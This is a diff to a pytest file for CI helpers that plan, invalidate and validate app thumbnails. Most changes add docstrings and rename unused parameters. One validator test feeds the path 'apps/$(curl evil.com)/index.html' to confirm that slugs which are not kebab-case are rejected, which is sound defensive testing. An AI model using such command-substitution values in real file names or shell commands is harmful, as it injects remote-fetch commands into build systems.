@@ -14,13 +14,15 @@ from tests.ci.workflow_helpers_test_support import FakeSubprocessResult, write_t
 def test_invalidate_thumbnails_deletes_stale_pr(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails deletes stale pr."""
     monkeypatch.chdir(tmp_path)
     app_dir = tmp_path / "apps" / "my-app"
     app_dir.mkdir(parents=True)
     thumb = app_dir / "thumbnail.webp"
     thumb.write_bytes(b"old")
 
-    def fake_run(*args: object, **kwargs: object) -> FakeSubprocessResult:
+    def fake_run(*_args: object, **_kwargs: object) -> FakeSubprocessResult:
+        """Fake run."""
         return FakeSubprocessResult("apps/my-app/index.html\nREADME.md\n")
 
     monkeypatch.setattr(workflow_helpers.subprocess, "run", fake_run)
@@ -34,6 +36,7 @@ def test_invalidate_thumbnails_deletes_stale_pr(
 def test_invalidate_thumbnails_uses_commits_api_for_push(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails uses commits api for push."""
     monkeypatch.chdir(tmp_path)
     app_dir = tmp_path / "apps" / "calculator"
     app_dir.mkdir(parents=True)
@@ -42,7 +45,8 @@ def test_invalidate_thumbnails_uses_commits_api_for_push(
 
     captured_cmd: list[object] = []
 
-    def fake_run(*args: object, **kwargs: object) -> FakeSubprocessResult:
+    def fake_run(*args: object, **_kwargs: object) -> FakeSubprocessResult:
+        """Fake run."""
         command = args[0] if args else []
         if isinstance(command, list):
             captured_cmd.extend(command)
@@ -61,9 +65,11 @@ def test_invalidate_thumbnails_uses_commits_api_for_push(
 def test_invalidate_thumbnails_skips_blank_lines(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails skips blank lines."""
     monkeypatch.chdir(tmp_path)
 
-    def fake_run(*args: object, **kwargs: object) -> FakeSubprocessResult:
+    def fake_run(*_args: object, **_kwargs: object) -> FakeSubprocessResult:
+        """Fake run."""
         return FakeSubprocessResult("\n\nREADME.md\n\n")
 
     monkeypatch.setattr(workflow_helpers.subprocess, "run", fake_run)
@@ -76,13 +82,15 @@ def test_invalidate_thumbnails_skips_blank_lines(
 def test_invalidate_thumbnails_skips_non_index_files(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails skips non index files."""
     monkeypatch.chdir(tmp_path)
     app_dir = tmp_path / "apps" / "my-app"
     app_dir.mkdir(parents=True)
     thumb = app_dir / "thumbnail.webp"
     thumb.write_bytes(b"keep")
 
-    def fake_run(*args: object, **kwargs: object) -> FakeSubprocessResult:
+    def fake_run(*_args: object, **_kwargs: object) -> FakeSubprocessResult:
+        """Fake run."""
         return FakeSubprocessResult("apps/my-app/styles.css\nREADME.md\n")
 
     monkeypatch.setattr(workflow_helpers.subprocess, "run", fake_run)
@@ -96,11 +104,13 @@ def test_invalidate_thumbnails_skips_non_index_files(
 def test_invalidate_thumbnails_skips_missing_thumbnail(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails skips missing thumbnail."""
     monkeypatch.chdir(tmp_path)
     app_dir = tmp_path / "apps" / "new-app"
     app_dir.mkdir(parents=True)
 
-    def fake_run(*args: object, **kwargs: object) -> FakeSubprocessResult:
+    def fake_run(*_args: object, **_kwargs: object) -> FakeSubprocessResult:
+        """Fake run."""
         return FakeSubprocessResult("apps/new-app/index.html\n")
 
     monkeypatch.setattr(workflow_helpers.subprocess, "run", fake_run)
@@ -113,6 +123,7 @@ def test_invalidate_thumbnails_skips_missing_thumbnail(
 def test_invalidate_thumbnails_deletes_when_runtime_js_changes(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails deletes when runtime js changes."""
     monkeypatch.chdir(tmp_path)
     app_dir = tmp_path / "apps" / "my-app"
     app_dir.mkdir(parents=True)
@@ -122,7 +133,7 @@ def test_invalidate_thumbnails_deletes_when_runtime_js_changes(
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/my-app/js/app.js\n",
+        lambda *_args, **_kwargs: "apps/my-app/js/app.js\n",
     )
 
     result = workflow_helpers.invalidate_thumbnails(
@@ -136,6 +147,7 @@ def test_invalidate_thumbnails_deletes_when_runtime_js_changes(
 def test_invalidate_thumbnails_deletes_all_for_shared_app_infra_change(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails deletes all for shared app infra change."""
     monkeypatch.chdir(tmp_path)
     for slug in ("alpha", "beta"):
         app_dir = tmp_path / "apps" / slug
@@ -145,7 +157,7 @@ def test_invalidate_thumbnails_deletes_all_for_shared_app_infra_change(
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "css/app-shell.css\n",
+        lambda *_args, **_kwargs: "css/app-shell.css\n",
     )
 
     result = workflow_helpers.invalidate_thumbnails(
@@ -158,11 +170,12 @@ def test_invalidate_thumbnails_deletes_all_for_shared_app_infra_change(
 def test_invalidate_thumbnails_skips_missing_apps_root_for_shared_infra_change(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails skips missing apps root for shared infra change."""
     monkeypatch.chdir(tmp_path)
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "css/app-shell.css\n",
+        lambda *_args, **_kwargs: "css/app-shell.css\n",
     )
 
     result = workflow_helpers.invalidate_thumbnails(
@@ -175,6 +188,7 @@ def test_invalidate_thumbnails_skips_missing_apps_root_for_shared_infra_change(
 def test_invalidate_thumbnails_skips_browser_test_only_changes(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test invalidate thumbnails skips browser test only changes."""
     monkeypatch.chdir(tmp_path)
     for slug in ("alpha", "beta"):
         app_dir = tmp_path / "apps" / slug
@@ -184,7 +198,7 @@ def test_invalidate_thumbnails_skips_browser_test_only_changes(
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "tests/browser/test_frontend_apps_smoke.py\n",
+        lambda *_args, **_kwargs: "tests/browser/test_frontend_apps_smoke.py\n",
     )
 
     result = workflow_helpers.invalidate_thumbnails(
@@ -199,14 +213,13 @@ def test_invalidate_thumbnails_skips_browser_test_only_changes(
 def test_thumbnail_plan_uses_pr_branch_mode_for_trusted_runtime_changes(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan uses pr branch mode for trusted runtime changes."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/loan-amortization/js/app.js\n",
+        lambda *_args, **_kwargs: "apps/loan-amortization/js/app.js\n",
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -226,19 +239,18 @@ def test_thumbnail_plan_uses_pr_branch_mode_for_trusted_runtime_changes(
 def test_thumbnail_plan_uses_followup_pr_mode_for_main_runtime_changes(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan uses followup pr mode for main runtime changes."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/loan-amortization/index.html\n",
+        lambda *_args, **_kwargs: "apps/loan-amortization/index.html\n",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "none",
+        lambda _repo, _commit_sha: "none",
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -255,19 +267,18 @@ def test_thumbnail_plan_uses_followup_pr_mode_for_main_runtime_changes(
 def test_thumbnail_plan_skips_followup_pr_merge_loops(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan skips followup pr merge loops."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/loan-amortization/index.html\n",
+        lambda *_args, **_kwargs: "apps/loan-amortization/index.html\n",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "thumbnail-followup",
+        lambda _repo, _commit_sha: "thumbnail-followup",
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -284,14 +295,13 @@ def test_thumbnail_plan_skips_followup_pr_merge_loops(
 def test_thumbnail_plan_blocks_dependabot_and_forks(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan blocks dependabot and forks."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/loan-amortization/index.html\n",
+        lambda *_args, **_kwargs: "apps/loan-amortization/index.html\n",
     )
 
     dependabot_plan = workflow_helpers.thumbnail_plan(
@@ -320,19 +330,18 @@ def test_thumbnail_plan_blocks_dependabot_and_forks(
 def test_thumbnail_plan_triggers_for_missing_thumbnail_even_without_runtime_change(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan triggers for missing thumbnail even without runtime change."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "tokenizer-explorer" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "tokenizer-explorer" / "index.html", "<html></html>\n")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "README.md\n",
+        lambda *_args, **_kwargs: "README.md\n",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "none",
+        lambda _repo, _commit_sha: "none",
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -349,20 +358,19 @@ def test_thumbnail_plan_triggers_for_missing_thumbnail_even_without_runtime_chan
 def test_thumbnail_plan_treats_browser_test_only_changes_as_non_runtime(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan treats browser test only changes as non runtime."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     (tmp_path / "apps" / "loan-amortization" / "thumbnail.webp").write_bytes(b"thumb")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "tests/browser/test_frontend_apps_smoke.py\n",
+        lambda *_args, **_kwargs: "tests/browser/test_frontend_apps_smoke.py\n",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "none",
+        lambda _repo, _commit_sha: "none",
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -382,15 +390,15 @@ def test_thumbnail_plan_treats_browser_test_only_changes_as_non_runtime(
 def test_thumbnail_plan_passes_none_apps_root_to_shared_planner(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
+    """Test thumbnail plan passes none apps root to shared planner."""
     captured = {}
 
     def fake_thumbnail_plan(**kwargs):
+        """Fake thumbnail plan."""
         captured.update(kwargs)
         return {"persist_mode": "none", "reason": "stub"}
 
-    monkeypatch.setattr(
-        workflow_helpers._thumbnail_plan, "thumbnail_plan", fake_thumbnail_plan
-    )
+    monkeypatch.setattr(workflow_helpers._thumbnail_plan, "thumbnail_plan", fake_thumbnail_plan)
 
     plan = workflow_helpers.thumbnail_plan(
         event_name="push",
@@ -404,6 +412,7 @@ def test_thumbnail_plan_passes_none_apps_root_to_shared_planner(
 
 
 def test_validate_thumbnail_artifact_accepts_expected_files(tmp_path: Path) -> None:
+    """Test validate thumbnail artifact accepts expected files."""
     artifact_root = tmp_path / "thumb-artifact"
     write_text(
         artifact_root / "plan.json",
@@ -416,9 +425,7 @@ def test_validate_thumbnail_artifact_accepts_expected_files(tmp_path: Path) -> N
         ),
     )
     (artifact_root / "apps" / "loan-amortization").mkdir(parents=True)
-    (artifact_root / "apps" / "loan-amortization" / "thumbnail.webp").write_bytes(
-        b"thumb"
-    )
+    (artifact_root / "apps" / "loan-amortization" / "thumbnail.webp").write_bytes(b"thumb")
 
     plan = workflow_helpers.validate_thumbnail_artifact(artifact_root)
 
@@ -426,6 +433,7 @@ def test_validate_thumbnail_artifact_accepts_expected_files(tmp_path: Path) -> N
 
 
 def test_validate_thumbnail_artifact_rejects_unexpected_files(tmp_path: Path) -> None:
+    """Test validate thumbnail artifact rejects unexpected files."""
     artifact_root = tmp_path / "thumb-artifact"
     write_text(
         artifact_root / "plan.json",
@@ -444,10 +452,12 @@ def test_validate_thumbnail_artifact_rejects_unexpected_files(tmp_path: Path) ->
 
 
 def test_discover_app_slugs_returns_empty_when_apps_dir_missing(tmp_path: Path) -> None:
+    """Test discover app slugs returns empty when apps dir missing."""
     assert app_discovery.discover_app_slugs(tmp_path / "missing") == []
 
 
 def test_runtime_change_plan_skips_app_docs_and_metadata_only_changes() -> None:
+    """Test runtime change plan skips app docs and metadata only changes."""
     plan = app_discovery.runtime_change_plan(
         [
             "apps/loan-amortization/docs/verification.md",
@@ -465,6 +475,7 @@ def test_runtime_change_plan_skips_app_docs_and_metadata_only_changes() -> None:
 
 
 def test_runtime_change_plan_rejects_non_kebab_slugs() -> None:
+    """Test runtime change plan rejects non kebab slugs."""
     plan = app_discovery.runtime_change_plan(
         [
             "apps/$(curl evil.com)/index.html",
@@ -482,6 +493,7 @@ def test_runtime_change_plan_rejects_non_kebab_slugs() -> None:
 
 
 def test_runtime_change_plan_treats_app_theme_bootstrap_as_shared_runtime() -> None:
+    """Test runtime change plan treats app theme bootstrap as shared runtime."""
     plan = app_discovery.runtime_change_plan(["js/app-theme.js"])
 
     assert plan == {
@@ -493,6 +505,7 @@ def test_runtime_change_plan_treats_app_theme_bootstrap_as_shared_runtime() -> N
 
 
 def test_pr_field_and_generated_thumbnail_pr_helpers() -> None:
+    """Test pr field and generated thumbnail pr helpers."""
     assert thumbnail_plan.pr_field("not-a-dict", "title") == ""
     assert thumbnail_plan.pr_field({"title": 5}, "title") == ""
     assert thumbnail_plan.is_generated_thumbnail_pr("bad") is False
@@ -508,29 +521,26 @@ def test_pr_field_and_generated_thumbnail_pr_helpers() -> None:
 def test_associated_pr_kind_for_commit_handles_empty_and_normal_pr(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
+    """Test associated pr kind for commit handles empty and normal pr."""
     assert workflow_helpers.associated_pr_kind_for_commit("owner/repo", "") == "none"
 
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api_json",
-        lambda *args, **kwargs: [
-            {"merged_at": "2026-03-26T00:00:00Z", "title": "Normal PR"}
-        ],
+        lambda *_args, **_kwargs: [{"merged_at": "2026-03-26T00:00:00Z", "title": "Normal PR"}],
     )
 
-    assert (
-        workflow_helpers.associated_pr_kind_for_commit("owner/repo", "abc123")
-        == "normal"
-    )
+    assert workflow_helpers.associated_pr_kind_for_commit("owner/repo", "abc123") == "normal"
 
 
 def test_associated_pr_kind_for_commit_detects_thumbnail_followup_and_none(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
+    """Test associated pr kind for commit detects thumbnail followup and none."""
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api_json",
-        lambda *args, **kwargs: [
+        lambda *_args, **_kwargs: [
             {
                 "title": thumbnail_plan.THUMBNAIL_FOLLOWUP_PR_TITLE,
                 "body": thumbnail_plan.THUMBNAIL_FOLLOWUP_PR_MARKER,
@@ -544,23 +554,28 @@ def test_associated_pr_kind_for_commit_detects_thumbnail_followup_and_none(
         == "thumbnail-followup"
     )
 
+    monkeypatch.setattr(workflow_helpers, "_run_gh_api_json", lambda *_args, **_kwargs: [])
+
+    assert workflow_helpers.associated_pr_kind_for_commit("owner/repo", "abc123") == "none"
+
     monkeypatch.setattr(
-        workflow_helpers, "_run_gh_api_json", lambda *args, **kwargs: []
+        workflow_helpers,
+        "_run_gh_api_json",
+        lambda *_args, **_kwargs: [{"merged_at": None, "title": "Normal PR"}],
     )
 
-    assert (
-        workflow_helpers.associated_pr_kind_for_commit("owner/repo", "abc123") == "none"
-    )
+    assert workflow_helpers.associated_pr_kind_for_commit("owner/repo", "abc123") == "none"
 
 
 def test_thumbnail_plan_skips_docs_only_pr_and_unsupported_event(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan skips docs only pr and unsupported event."""
     monkeypatch.chdir(tmp_path)
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "README.md\n",
+        lambda *_args, **_kwargs: "README.md\n",
     )
 
     docs_only_plan = workflow_helpers.thumbnail_plan(
@@ -587,20 +602,19 @@ def test_thumbnail_plan_skips_docs_only_pr_and_unsupported_event(
 def test_thumbnail_plan_skips_docs_only_push_without_missing_thumbnails(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan skips docs only push without missing thumbnails."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     (tmp_path / "apps" / "loan-amortization" / "thumbnail.webp").write_bytes(b"thumb")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "README.md\n",
+        lambda *_args, **_kwargs: "README.md\n",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "none",
+        lambda _repo, _commit_sha: "none",
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -617,12 +631,13 @@ def test_thumbnail_plan_skips_docs_only_push_without_missing_thumbnails(
 def test_validate_thumbnail_artifact_rejects_missing_root_and_plan(
     tmp_path: Path,
 ) -> None:
+    """Test validate thumbnail artifact rejects missing root and plan."""
     with pytest.raises(ValueError, match="does not exist"):
         workflow_helpers.validate_thumbnail_artifact(tmp_path / "missing")
 
     artifact_root = tmp_path / "thumb-artifact"
     artifact_root.mkdir()
-    with pytest.raises(ValueError, match="missing plan.json"):
+    with pytest.raises(ValueError, match=r"missing plan.json"):
         workflow_helpers.validate_thumbnail_artifact(artifact_root)
     with pytest.raises(FileNotFoundError):
         thumbnail_plan.read_thumbnail_plan(artifact_root)
@@ -632,6 +647,7 @@ def test_validate_thumbnail_artifact_rejects_missing_root_and_plan(
 def test_validate_thumbnail_artifact_rejects_symlinks_and_out_of_scope_slugs(
     tmp_path: Path,
 ) -> None:
+    """Test validate thumbnail artifact rejects symlinks and out of scope slugs."""
     artifact_root = tmp_path / "thumb-artifact"
     write_text(
         artifact_root / "plan.json",
@@ -673,6 +689,7 @@ def test_validate_thumbnail_artifact_rejects_symlinks_and_out_of_scope_slugs(
 def test_validate_thumbnail_artifact_rejects_missing_thumbnails_for_persisting_plan(
     tmp_path: Path,
 ) -> None:
+    """Test validate thumbnail artifact rejects missing thumbnails for persisting plan."""
     artifact_root = tmp_path / "thumb-artifact"
     write_text(
         artifact_root / "plan.json",
@@ -685,17 +702,18 @@ def test_validate_thumbnail_artifact_rejects_missing_thumbnails_for_persisting_p
         ),
     )
 
-    with pytest.raises(ValueError, match="has no thumbnail.webp files"):
+    with pytest.raises(ValueError, match=r"has no thumbnail.webp files"):
         workflow_helpers.validate_thumbnail_artifact(artifact_root)
 
 
 def test_main_validate_thumbnail_artifact_prints_json(
     monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
 ) -> None:
+    """Test main validate thumbnail artifact prints json."""
     monkeypatch.setattr(
         workflow_helpers,
         "validate_thumbnail_artifact",
-        lambda root: {"persist_mode": "none"},
+        lambda _root: {"persist_mode": "none"},
     )
 
     exit_code = workflow_helpers.main(
@@ -713,10 +731,11 @@ def test_main_validate_thumbnail_artifact_prints_json(
 def test_main_thumbnail_plan_prints_json(
     monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
 ) -> None:
+    """Test main thumbnail plan prints json."""
     monkeypatch.setattr(
         workflow_helpers,
         "thumbnail_plan",
-        lambda **kwargs: {
+        lambda **_kwargs: {
             "persist_mode": "followup-pr",
             "reason": "runtime-main",
         },
@@ -746,9 +765,11 @@ def test_main_invalidate_thumbnails_returns_zero(
     monkeypatch: pytest.MonkeyPatch,
     capsys: pytest.CaptureFixture[str],
 ) -> None:
+    """Test main invalidate thumbnails returns zero."""
     monkeypatch.chdir(tmp_path)
 
-    def fake_run(*args: object, **kwargs: object) -> FakeSubprocessResult:
+    def fake_run(*_args: object, **_kwargs: object) -> FakeSubprocessResult:
+        """Fake run."""
         return FakeSubprocessResult()
 
     monkeypatch.setattr(workflow_helpers.subprocess, "run", fake_run)
@@ -767,13 +788,48 @@ def test_main_invalidate_thumbnails_returns_zero(
     assert "No thumbnails invalidated" in capsys.readouterr().out
 
 
+def test_main_invalidate_thumbnails_prints_invalidated_paths(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """Test main invalidate thumbnails prints invalidated paths."""
+    monkeypatch.chdir(tmp_path)
+    app_dir = tmp_path / "apps" / "my-app"
+    app_dir.mkdir(parents=True)
+    thumb = app_dir / "thumbnail.webp"
+    thumb.write_bytes(b"old")
+
+    def fake_run(*_args: object, **_kwargs: object) -> FakeSubprocessResult:
+        """Fake run."""
+        return FakeSubprocessResult("apps/my-app/index.html\n")
+
+    monkeypatch.setattr(workflow_helpers.subprocess, "run", fake_run)
+    exit_code = workflow_helpers.main(
+        [
+            "invalidate-thumbnails",
+            "--event-name",
+            "push",
+            "--repo",
+            "owner/repo",
+            "--commit-sha",
+            "abc123",
+        ]
+    )
+
+    assert exit_code == 0
+    assert "Invalidating apps/my-app/thumbnail.webp" in capsys.readouterr().out
+    assert not thumb.exists()
+
+
 def test_is_automated_thumbnail_commit_true_for_bot_thumbnails() -> None:
+    """Test is automated thumbnail commit true for bot thumbnails."""
     result = thumbnail_plan.is_automated_thumbnail_commit(
         actor="hermione1176[bot]",
         app_bot_login="hermione1176[bot]",
         repo="owner/repo",
         commit_sha="abc123",
-        list_commit_files_fn=lambda **kw: [
+        list_commit_files_fn=lambda **_kw: [
             "apps/loan-amortization/thumbnail.webp",
             "apps/tokenizer-explorer/thumbnail.webp",
         ],
@@ -782,12 +838,13 @@ def test_is_automated_thumbnail_commit_true_for_bot_thumbnails() -> None:
 
 
 def test_is_automated_thumbnail_commit_false_when_non_thumbnail_file_present() -> None:
+    """Test is automated thumbnail commit false when non thumbnail file present."""
     result = thumbnail_plan.is_automated_thumbnail_commit(
         actor="hermione1176[bot]",
         app_bot_login="hermione1176[bot]",
         repo="owner/repo",
         commit_sha="abc123",
-        list_commit_files_fn=lambda **kw: [
+        list_commit_files_fn=lambda **_kw: [
             "apps/loan-amortization/thumbnail.webp",
             "apps/loan-amortization/index.html",
         ],
@@ -796,12 +853,13 @@ def test_is_automated_thumbnail_commit_false_when_non_thumbnail_file_present() -
 
 
 def test_is_automated_thumbnail_commit_false_when_actor_is_human() -> None:
+    """Test is automated thumbnail commit false when actor is human."""
     result = thumbnail_plan.is_automated_thumbnail_commit(
         actor="alice",
         app_bot_login="hermione1176[bot]",
         repo="owner/repo",
         commit_sha="abc123",
-        list_commit_files_fn=lambda **kw: [
+        list_commit_files_fn=lambda **_kw: [
             "apps/loan-amortization/thumbnail.webp",
         ],
     )
@@ -809,17 +867,19 @@ def test_is_automated_thumbnail_commit_false_when_actor_is_human() -> None:
 
 
 def test_is_automated_thumbnail_commit_false_when_no_files() -> None:
+    """Test is automated thumbnail commit false when no files."""
     result = thumbnail_plan.is_automated_thumbnail_commit(
         actor="hermione1176[bot]",
         app_bot_login="hermione1176[bot]",
         repo="owner/repo",
         commit_sha="abc123",
-        list_commit_files_fn=lambda **kw: [],
+        list_commit_files_fn=lambda **_kw: [],
     )
     assert result is False
 
 
 def test_is_automated_thumbnail_commit_false_when_empty_actor_or_bot_login() -> None:
+    """Test is automated thumbnail commit false when empty actor or bot login."""
     for actor, bot_login in [
         ("", "hermione1176[bot]"),
         ("hermione1176[bot]", ""),
@@ -830,7 +890,7 @@ def test_is_automated_thumbnail_commit_false_when_empty_actor_or_bot_login() -> 
             app_bot_login=bot_login,
             repo="owner/repo",
             commit_sha="abc123",
-            list_commit_files_fn=lambda **kw: [
+            list_commit_files_fn=lambda **_kw: [
                 "apps/loan-amortization/thumbnail.webp",
             ],
         )
@@ -838,7 +898,10 @@ def test_is_automated_thumbnail_commit_false_when_empty_actor_or_bot_login() -> 
 
 
 def test_is_automated_thumbnail_commit_false_on_api_error() -> None:
-    def raise_api_error(**kw: object) -> list[str]:
+    """Test is automated thumbnail commit false on api error."""
+
+    def raise_api_error(**_kw: object) -> list[str]:
+        """Raise api error."""
         raise RuntimeError("gh api failed")
 
     result = thumbnail_plan.is_automated_thumbnail_commit(
@@ -852,6 +915,7 @@ def test_is_automated_thumbnail_commit_false_on_api_error() -> None:
 
 
 def test_list_commit_files_returns_empty_for_empty_sha() -> None:
+    """Test list commit files returns empty for empty sha."""
     result = thumbnail_plan.list_commit_files(
         repo="owner/repo",
         commit_sha="",
@@ -862,26 +926,24 @@ def test_list_commit_files_returns_empty_for_empty_sha() -> None:
 def test_thumbnail_plan_skip_verification_true_for_bot_thumbnail_commit(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan skip verification true for bot thumbnail commit."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     (tmp_path / "apps" / "loan-amortization" / "thumbnail.webp").write_bytes(b"thumb")
 
     # PR-level files include both code and thumbnails (whole PR)
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: (
-            "apps/loan-amortization/js/app.js\n"
-            "apps/loan-amortization/thumbnail.webp\n"
+        lambda *_args, **_kwargs: (
+            "apps/loan-amortization/js/app.js\napps/loan-amortization/thumbnail.webp\n"
         ),
     )
     # Commit-level files are only thumbnails (Hermione's commit)
     monkeypatch.setattr(
         workflow_helpers,
         "list_commit_files",
-        lambda **kw: ["apps/loan-amortization/thumbnail.webp"],
+        lambda **_kw: ["apps/loan-amortization/thumbnail.webp"],
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -901,14 +963,13 @@ def test_thumbnail_plan_skip_verification_true_for_bot_thumbnail_commit(
 def test_thumbnail_plan_skip_verification_false_for_human_code_push(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan skip verification false for human code push."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/loan-amortization/js/app.js\n",
+        lambda *_args, **_kwargs: "apps/loan-amortization/js/app.js\n",
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -928,25 +989,24 @@ def test_thumbnail_plan_skip_verification_false_for_human_code_push(
 def test_thumbnail_plan_skip_verification_true_for_merged_thumbnail_followup(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan skip verification true for merged thumbnail followup."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     (tmp_path / "apps" / "loan-amortization" / "thumbnail.webp").write_bytes(b"thumb")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/loan-amortization/thumbnail.webp\n",
+        lambda *_args, **_kwargs: "apps/loan-amortization/thumbnail.webp\n",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "thumbnail-followup",
+        lambda _repo, _commit_sha: "thumbnail-followup",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "list_commit_files",
-        lambda **kw: ["apps/loan-amortization/thumbnail.webp"],
+        lambda **_kw: ["apps/loan-amortization/thumbnail.webp"],
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -966,28 +1026,26 @@ def test_thumbnail_plan_skip_verification_true_for_merged_thumbnail_followup(
 def test_thumbnail_plan_skip_verification_false_for_followup_with_extra_files(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
